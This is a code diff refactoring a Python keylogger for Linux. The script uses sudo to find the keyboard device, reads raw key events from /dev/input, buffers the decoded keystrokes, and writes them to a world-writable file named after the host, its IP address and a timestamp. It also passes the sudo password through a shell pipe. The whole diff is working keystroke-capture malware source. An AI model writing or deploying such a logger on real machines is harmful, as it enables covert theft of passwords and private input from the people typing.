@@ -48,10 +48,10 @@ KEY_DICTIONARY_MAP = {
     37: ('K', 'k'),
     38: ('L', 'l'),
     39: (';', ':'),
-    40: ("'", "\""),
-    41: ('``', '~'),
+    40: ("\"", "'"),
+    41: ('~', '``'),
     42: ('LEFTSHIFT', 'leftshift'),
-    43: ('\\', '|'),
+    43: ('|', '\\'),
     44: ('Z', 'z'),
     45: ('X', 'x'),
     46: ('C', 'c'),
@@ -59,9 +59,9 @@ KEY_DICTIONARY_MAP = {
     48: ('B', 'b'),
     49: ('N', 'n'),
     50: ('M', 'm'),
-    51: (',', '<'),
-    52: ('.', '>'),
-    53: ('/', '?'),
+    51: ('<', ','),
+    52: ('>', '.'),
+    53: ('?', '/'),
     54: ('RIGHTSHIFT', 'rightshift'),
     55: ('*', '*'),  # For numeric keypad
     56: ('LEFTALT', 'leftalt'),
@@ -157,19 +157,41 @@ KEY_DICTIONARY_MAP = {
     240: ('UNKNOWN', 'unknown')
 }
 
-if __name__ == '__main__':
-    # Initialize Variables
-    event = ""
 
-    # Get the sudo password from the user
-    sudo_password = getpass.getpass("[+] Enter your sudo password: ")
+def __create_write_to_keylog_file(filename: str, buffer: str):
+    """
+    A
 
-    # Running the command to find which eventX is the keyboard from /dev/input
-    command = "sudo -S cat /proc/bus/input/devices | grep \"Handlers=sysrq kbd\""
-
-    # a) Use subprocess to run the sudo command
+    :param filename:
+    :param buffer:
+    :return:
+    """
     try:
-        result = subprocess.run(f"echo '{sudo_password}' | {command}",
+        print(f"[+] CREATING FILE: Now creating keylog file...")
+
+        with open(filename, "w") as f:
+            for key in buffer:
+                f.write(key)
+
+        os.chmod(f"{filename}", 0o777)
+        print(f"[+] FILE CREATED: File '{filename}' has been created successfully.")
+    except IOError as e:
+        print(f"[+] ERROR: An error has occurred while creating .txt file: {e}")
+
+
+def __create_file_name():
+    current_datetime = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    filename = f"{hostname}_{ip_address}_{current_datetime}.txt"  # Format: {Hostname}_{IP_addr}_{Date}_{Time}
+
+    return filename
+
+
+def __get_kb_event(password: str, cmd: str):
+    try:
+        event_x = ""
+        result = subprocess.run(f"echo '{password}' | {cmd}",
                                 shell=True,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
@@ -191,44 +213,34 @@ if __name__ == '__main__':
                 if closest_match:
                     index = parsed_line.index(closest_match[0])
                     print(f"[+] Keyboard event found in: {closest_match[0]}")
-                    event = parsed_line[index]
+                    event_x = parsed_line[index]
                 else:
                     sys.exit("[+] ERROR: No keyboard device has been found! (Now terminating program...)")
                 break
+
+            return event_x
         else:
             sys.exit("[+] ERROR: The command has failed! (Now terminating program...)")
 
     except subprocess.CalledProcessError as e:
         print("[+] ERROR: An error has occurred while running the command: ", e)
 
-    # b) Get date and host information (for appending to .txt file name)
-    current_datetime = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    file_name = f"{hostname}_{ip_address}_{current_datetime}.txt"  # Format: {Hostname}_{IP_addr}_{Date}_{Time}
 
-    # c) Create a new .txt file to record and log keystrokes (with rwx permissions)
-    #     try:
-    #         with open(file_name, "w") as file:
-    #             pass
-    #         os.chmod(f"{file_name}", 0o777)
-    #         print(f"[+] FILE CREATED: File '{file_name}' has been created successfully.")
-    #     except IOError as e:
-    #         print(f"[+] ERROR: An error has occurred while creating .txt file: {e}")
-
-    # d) Opening the "/dev/input/eventX" file in the read-binary mode
+def __perform_keylog(event_x: str,
+                     stop: bool,
+                     buffer: str):
     try:
         # Initialize a variable to track the Shift key state
         capitalized = False
 
-        # Initialize a dictionary to track the state of each key
+        # Initialize a dictionary to keep track of the state of each key (pressed or not)
         key_state = {}
 
-        with open(f"/dev/input/{event}", "rb") as file:
-            while True:
+        with open(f"/dev/input/{event_x}", "rb") as file:
+            while True and stop is False:
                 # Event FORMAT: {timestamp, time_in_microseconds, event_type, event_code, event_value}
-                event = file.read(24)
-                _, _, event_type, event_code, event_value = struct.unpack("LLHHi", event)
+                event_x = file.read(24)
+                _, _, event_type, event_code, event_value = struct.unpack("LLHHi", event_x)
 
                 # If key press event, then event_type is 1
                 if event_type == 1:
@@ -246,17 +258,43 @@ if __name__ == '__main__':
                             else:
                                 char_pressed = lowercase_key
 
-                            # Check if the key was previously not pressed
+                            # Log the key (without duplicates)
                             if event_code not in key_state or key_state[event_code] == 0:
-                                print(char_pressed)
+                                buffer += char_pressed
 
                             # Update the key state
                             key_state[event_code] = event_value
                     else:
                         print(f"[+] Key code {event_code} not mapped to a character")
+            return buffer
 
     except IOError as e:
         sys.exit(f"[+] ERROR: An error has occurred while reading the event file: {e}")
-    except KeyboardInterrupt:
-        sys.exit("[+] ERROR: KeyboardInterrupt was called! (Now terminating program...)")
 
+    except KeyboardInterrupt:
+        print("[+] KEYLOGGER STOPPED: A KeyboardInterrupt was called!")
+        return buffer
+
+
+if __name__ == '__main__':
+    # Initialize Variables
+    signal_stop = False
+    keylog_buffer = ""
+
+    # Get the sudo password from the user
+    sudo_password = getpass.getpass("[+] Enter your sudo password: ")
+
+    # The Linux command to find which eventX is the keyboard from /dev/input
+    command = "sudo -S cat /proc/bus/input/devices | grep \"Handlers=sysrq kbd\""
+
+# a) Use subprocess to run the sudo command
+    event = __get_kb_event(sudo_password, command)
+
+# b) Perform keylogger by opening the "/dev/input/eventX" file in the read-binary mode
+    keylog_buffer = __perform_keylog(event, signal_stop, keylog_buffer)
+
+# c) Get date and host information (for appending to .txt file name)
+    file_name = __create_file_name()
+
+# d) Create a new .txt file to record and log keystrokes (with rwx permissions)
+    __create_write_to_keylog_file(file_name, keylog_buffer)
